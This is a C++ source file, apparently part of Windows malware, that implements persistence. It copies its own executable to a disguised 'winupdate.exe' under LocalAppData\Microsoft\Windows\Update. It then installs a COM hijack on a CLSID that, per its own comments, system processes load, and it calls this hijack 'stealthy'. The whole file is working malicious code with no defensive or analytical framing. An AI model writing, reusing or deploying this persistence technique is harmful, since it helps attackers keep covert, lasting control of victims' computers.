#include "Persistence.h"
#include "ComHijacker.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>

namespace persistence {

namespace {

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

std::wstring getPersistPath() {
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) != S_OK) {
        return L"";
    }

    std::wstring dir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Update";
    CreateDirectoryW(dir.c_str(), NULL);

    return dir + L"\\winupdate.exe";
}

} // namespace

bool establishPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistPath();

    if (persistPath.empty()) return false;

    // Check if we are already running from the persistence path
    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        return false;
    }

    // Copy self to persistence path
    if (!CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE)) {
        // If copy fails, we might already exist or permission issue
        // But we should continue to attempt hijacking if possible
    }

    // Stealthy COM Hijack: Windows Desktop Bridge CLSID
    // This often gets loaded by various system processes.
    std::wstring clsid = L"{BC361022-CE9A-4592-B263-E979C5A30567}";

    if (ComHijacker::Install(persistPath, clsid)) {
        return true;
    }

    return false;
}

} // namespace persistence
